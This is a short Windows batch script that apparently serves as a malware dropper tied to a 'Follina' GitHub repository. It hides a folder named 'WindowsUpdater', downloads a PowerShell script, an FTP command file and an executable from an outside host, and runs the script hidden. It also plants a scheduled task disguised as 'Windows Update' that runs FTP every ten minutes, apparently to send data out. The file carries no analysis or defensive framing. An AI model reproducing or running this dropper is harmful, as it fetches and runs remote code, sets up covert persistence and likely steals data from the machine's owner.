@echo off

cd "C:\ProgramData"
mkdir "C:\ProgramData\WindowsUpdater"
attrib +h "C:\ProgramData\WindowsUpdater"							

cd "C:\ProgramData\WindowsUpdater"
curl -LJO https://github.com/Prevail9/Follina/raw/main/desmon.ps1 -o "C:\ProgramData\WindowsUpdater"
curl -LJO https://github.com/Prevail9/Follina/raw/main/ftp.txt -o "C:\ProgramData\WindowsUpdater"
curl -LJO https://github.com/Prevail9/Follina/raw/main/winupdater.exe -o "C:\ProgramData\WindowsUpdater"

powershell.exe -WindowStyle hidden "C:\ProgramData\WindowsUpdater"\desmon.ps1"

schtasks /create /tn "Windows Update" /tr "powershell.exe -WindowStyle hidden -c """ftp -A -s:'''C:\ProgramData\WindowsUpdater\ftp.txt'''"""" /sc minute /mo 10

start winupdater.exe